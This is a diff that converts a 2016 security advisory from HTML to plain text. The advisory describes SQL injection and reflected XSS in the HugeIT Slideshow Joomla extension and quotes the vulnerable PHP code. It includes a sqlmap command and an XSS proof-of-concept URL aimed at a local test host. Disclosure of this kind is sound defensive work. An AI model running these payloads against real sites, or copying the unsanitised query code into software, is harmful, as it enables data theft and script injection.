@@ -1,83 +1,69 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 */
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 166&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; XSS &amp; SQLi in HugeIT slideshow v1.0.4&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2016-07-17&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="http://extensions.joomla.org/extensions/extension/photos-a-images/slideshow/slideshow">http://extensions.joomla.org/extensions/extension/photos-a-images/slideshow/slideshow</a>"&gt;<a href="http://extensions.joomla.org/extensions/extension/photos-a-images/slideshow/slideshow&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">http://extensions.joomla.org/extensions/extension/photos-a-images/slideshow/slideshow&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;<a href="http://www.hugeit.com/">www.hugeit.com</a>&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2016-07-17&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="mailto:info@huge-it.com">info@huge-it.com</a>&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;Huge-IT Slideshow Extension is one of the powerful products that our company offers. It gives style and charm to your site and help to attract the attention of visitors to certain parts of the content.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;The attacker must be logged in with at least manager level access or access to the administrative panel to exploit this vulnerability.
-</p><p>The following functions in ./models/slideshow.php are vulnerable to SQL injection as all parameters being passed to them are not sanitized:
-</p>
-<pre>
- 51     public function getPropertie() {
- 52         $db = JFactory::getDBO();
- 53         $id_cat = JRequest::getVar(&amp;#039;id&amp;#039;);
- 54         $query = $db-&amp;gt;getQuery(true);
- 55         $query-&amp;gt;select(&amp;#039;<strong>__huge_itslideshow_images.name as name,&amp;</strong>039;
- 56                 . &amp;#039;<strong>__huge_itslideshow_images.id ,&amp;</strong>039;
- 57                 . &amp;#039;<strong>__huge_itslideshow_slideshows.name as portName,&amp;</strong>039;
- 58                 . &amp;#039;slideshow_id, <strong>__huge_itslideshow_images.description as     description,image_url,sl_url,sl_type,link_target,</strong>__huge_itslideshow_imag    es.ordering,<strong>__huge_itslideshow_images.published,published_in_sl_width&amp;</strong>039;);
- 59         $query-&amp;gt;from(array(&amp;#039;<strong>__huge_itslideshow_slideshows&amp;</strong>039; =&amp;gt; &amp;#039;<strong>__huge_it    slideshow_slideshows&amp;</strong>039;, &amp;#039;<strong>__huge_itslideshow_images&amp;</strong>039; =&amp;gt; &amp;#039;<strong>__huge_itslidesho    w_images&amp;</strong>039;));
- 60         $query-&amp;gt;where(&amp;#039;<strong>__huge_itslideshow_slideshows.id = slideshow_id&amp;</strong>039;)-    &amp;gt;where(&amp;#039;slideshow_id=&amp;#039; . $id_cat);
- 61         $query-&amp;gt;order(&amp;#039;ordering desc&amp;#039;);
- 62         $db-&amp;gt;setQuery($query);
- 63         $results = $db-&amp;gt;loadObjectList();
- 64         return $results;
- 65     }   </pre>
-
-<pre>
- 67     public function getImageByID() {
- 68         $db = JFactory::getDBO();
- 69         $id_cat = JRequest::getVar(&amp;#039;id&amp;#039;);
- 70         $query = $db-&amp;gt;getQuery(true);
- 71         $query-&amp;gt;select(&amp;#039;*&amp;#039;);
- 72         $query-&amp;gt;from(&amp;#039;<strong>__huge_itslideshow_images&amp;</strong>039;);
- 73         $query-&amp;gt;where(&amp;#039;slideshow_id=&amp;#039; . $id_cat);
- 74         $db-&amp;gt;setQuery($query);
- 75         $results = $db-&amp;gt;loadObjectList();
- 76         return $results;
- 77     } </pre>
-
-<p>  79    public function save($data) {
-</p><pre>
- 80         $db = JFactory::getDBO();
- 81         $result = $this-&amp;gt;getPropertie();
- 82         $this-&amp;gt;updarteSlideshow();
- 83         $this-&amp;gt;selectStyle();
- 84         foreach ($result as $key =&amp;gt; $value) {
- 85             $imageId = $value-&amp;gt;id;
- 86             $id = $data[&amp;#039;imageId&amp;#039;. $imageId];
- 87             $titleimage = $data[&amp;#039;titleimage&amp;#039; . $imageId];
- 88             $im_description = $data[&amp;#039;im_description&amp;#039;. $imageId];
- 89             $sl_url = $data[&amp;#039;sl_url&amp;#039;. $imageId];
- 90             $sl_link_target = $data[&amp;#039;sl_link_target&amp;#039;. $imageId];
- 91             $ordering = $data[&amp;#039;order_by_&amp;#039;. $imageId];
- 92             $image_url = $data[&amp;#039;image_url&amp;#039;. $imageId];
- 93 
- 94             $query = $db-&amp;gt;getQuery(true);
- 95             $query-&amp;gt;update(&amp;#039;<strong>__huge_itslideshow_images&amp;</strong>039;)-&amp;gt;set(&amp;#039;name=&amp;quot;&amp;#039; . $    titleimage . &amp;#039;&amp;quot;&amp;#039;)-&amp;gt;set(&amp;#039;description=&amp;quot;&amp;#039; . $im_description . &amp;#039;&amp;quot;&amp;#039;)
- 96                     -&amp;gt;set(&amp;#039;sl_url=&amp;quot;&amp;#039; . $sl_url . &amp;#039;&amp;quot;&amp;#039;)-&amp;gt;set(&amp;#039;link_target=&amp;quot;&amp;#039;     . $sl_link_target . &amp;#039;&amp;quot;&amp;#039;)
- 97                     -&amp;gt;set(&amp;#039;ordering=&amp;quot;&amp;#039; . $ordering . &amp;#039;&amp;quot;&amp;#039;)-&amp;gt;set(&amp;#039;image_url=    &amp;quot;&amp;#039; . $image_url . &amp;#039;&amp;quot;&amp;#039;)-&amp;gt;where(&amp;#039;id=&amp;#039; . $imageId);
- 98             $db-&amp;gt;setQuery($query);
- 99             $db-&amp;gt;execute();</pre>
-<p>The rest of the source files all have similar vulnerabilities:
-</p><p>./models/fields/slideshow.php<br/>
-./models/slideshows.php<br/>
-./models/video.php<br/>
-./models/forms/general.php<br/>
-./models/general.php
-</p>
-<p>Refective XSS in ./views/slideshow/tmpl/default.php in id parameter.
-</p><p>117:  &amp;lt;a class=&amp;quot;modal&amp;quot; rel=&amp;quot;{handler: &amp;#039;iframe&amp;#039;, size: {x: 800, y: 500}}&amp;quot; href=&amp;quot;index.php?option=com_slideshow&amp;amp;view=video&amp;amp;tmpl=component&amp;amp;pid=&amp;lt;?php echo $<u>GET[&amp;#039;id&amp;#039;]; ?&amp;gt;&amp;quot; title=&amp;quot;Video&amp;quot; &amp;gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2016-1000117 2016-1000118&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=166"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;SQLi&lt;span style="color: #339933;"&gt;:&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;$ sqlmap  &lt;span style="color: #339933;"&gt;--&lt;/span&gt;load&lt;span style="color: #339933;"&gt;-&lt;/span&gt;cookies&lt;span style="color: #339933;"&gt;=&lt;/span&gt;cookies&lt;span style="color: #339933;"&gt;.&lt;/span&gt;txt &lt;span style="color: #339933;"&gt;-&lt;/span&gt;u &lt;span style="color: #0000ff;"&gt;&amp;quot;<a href="http://192.168.0.125/administrator/index.php?option=com</u>slideshow&amp;amp;view=slideshow&amp;amp;id">http://192.168.0.125/administrator/index.php?option=com_slideshow&amp;amp;view=slideshow&amp;amp;id</a>=*&amp;quot;&lt;/span&gt; &lt;span style="color: #339933;"&gt;--&lt;/span&gt;dbms &lt;a href="<a href="http://www.php.net/mysql">http://www.php.net/mysql</a>"&gt;&lt;span style="color: #990000;"&gt;mysql&lt;/span&gt;&lt;/a&gt; &lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;XSS&lt;span style="color: #339933;"&gt;:&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;http&lt;span style="color: #339933;"&gt;:&lt;/span&gt;&lt;span style="color: #666666; font-style: italic;"&gt;//192.168.0.125/administrator/index.php?option=com_slideshow&amp;amp;view=slideshow&amp;amp;id=1--%20%22%3E%3Cscript%3Ealert(1);%3C/script%3E&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href=""&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt;
-&lt;/html&gt;
-</p>
-
-</body>
-</html>
+                                Advisory #: 166
+Title: XSS & SQLi in HugeIT slideshow v1.0.4
+Author:Larry W. Cashdollar, @_larry0
+Date: 2016-07-17
+Download Site: http://extensions.joomla.org/extensions/extension/photos-a-
+images/slideshow/slideshow
+Vendor:www.hugeit.com
+Vendor Notified: 2016-07-17
+Vendor Contact: info@huge-it.com
+Description: Huge-IT Slideshow Extension is one of the powerful products that
+our company offers. It gives style and charm to your site and help to attract
+the attention of visitors to certain parts of the content.
+Vulnerability:
+The attacker must be logged in with at least manager level access or access to
+the administrative panel to exploit this vulnerability. The following functions
+in ./models/slideshow.php are vulnerable to SQL injection as all parameters
+being passed to them are not sanitized: 51 public function getPropertie() { 52
+$db = JFactory::getDBO(); 53 $id_cat = JRequest::getVar('id'); 54 $query = $db-
+>getQuery(true); 55 $query->select('#__huge_itslideshow_images.name as name,'
+56 . '#__huge_itslideshow_images.id ,' 57 .
+'#__huge_itslideshow_slideshows.name as portName,' 58 . 'slideshow_id,
+#__huge_itslideshow_images.description as
+description,image_url,sl_url,sl_type,link_target,#__huge_itslideshow_imag
+es.ordering,#__huge_itslideshow_images.published,published_in_sl_width'); 59
+$query->from(array('#__huge_itslideshow_slideshows' => '#__huge_it
+slideshow_slideshows', '#__huge_itslideshow_images' => '#__huge_itslidesho
+w_images')); 60 $query->where('#__huge_itslideshow_slideshows.id =
+slideshow_id')- >where('slideshow_id=' . $id_cat); 61 $query->order('ordering
+desc'); 62 $db->setQuery($query); 63 $results = $db->loadObjectList(); 64
+return $results; 65 } 67 public function getImageByID() { 68 $db = JFactory::
+getDBO(); 69 $id_cat = JRequest::getVar('id'); 70 $query = $db->getQuery(true);
+71 $query->select('*'); 72 $query->from('#__huge_itslideshow_images'); 73
+$query->where('slideshow_id=' . $id_cat); 74 $db->setQuery($query); 75 $results
+= $db->loadObjectList(); 76 return $results; 77 } 79 public function save
+($data) { 80 $db = JFactory::getDBO(); 81 $result = $this->getPropertie(); 82
+$this->updarteSlideshow(); 83 $this->selectStyle(); 84 foreach ($result as $key
+=> $value) { 85 $imageId = $value->id; 86 $id = $data['imageId'. $imageId]; 87
+$titleimage = $data['titleimage' . $imageId]; 88 $im_description = $data
+['im_description'. $imageId]; 89 $sl_url = $data['sl_url'. $imageId]; 90
+$sl_link_target = $data['sl_link_target'. $imageId]; 91 $ordering = $data
+['order_by_'. $imageId]; 92 $image_url = $data['image_url'. $imageId]; 93 94
+$query = $db->getQuery(true); 95 $query->update('#__huge_itslideshow_images')-
+>set('name="' . $ titleimage . '"')->set('description="' . $im_description .
+'"') 96 ->set('sl_url="' . $sl_url . '"')->set('link_target="' .
+$sl_link_target . '"') 97 ->set('ordering="' . $ordering . '"')->set
+('image_url= "' . $image_url . '"')->where('id=' . $imageId); 98 $db->setQuery
+($query); 99 $db->execute(); The rest of the source files all have similar
+vulnerabilities: ./models/fields/slideshow.php ./models/slideshows.php ./
+models/video.php ./models/forms/general.php ./models/general.php Refective XSS
+in ./views/slideshow/tmpl/default.php in id parameter. 117: <a class="modal"
+rel="{handler: 'iframe', size: {x: 800, y: 500}}"
+href="index.php?option=com_slideshow&view=video&tmpl=component&pid=<?php echo
+$_GET['id']; ?>" title="Video" >
+CVE-2016-1000117 2016-1000118
+JSON:Export
+Exploit Code:
+   1. SQLi:
+   2.  
+   3. $ sqlmap  --load-cookies=cookies.txt -u "http://192.168.0.125/
+      administrator/index.php?option=com_slideshow&view=slideshow&id=*" --dbms
+      mysql
+   4.  
+   5. XSS:
+   6.  
+   7. http://192.168.0.125/administrator/
+      index.php?option=com_slideshow&view=slideshow&id=1--
+      %20%22%3E%3Cscript%3Ealert(1);%3C/script%3E
+Screen Shots:
+Advisory:
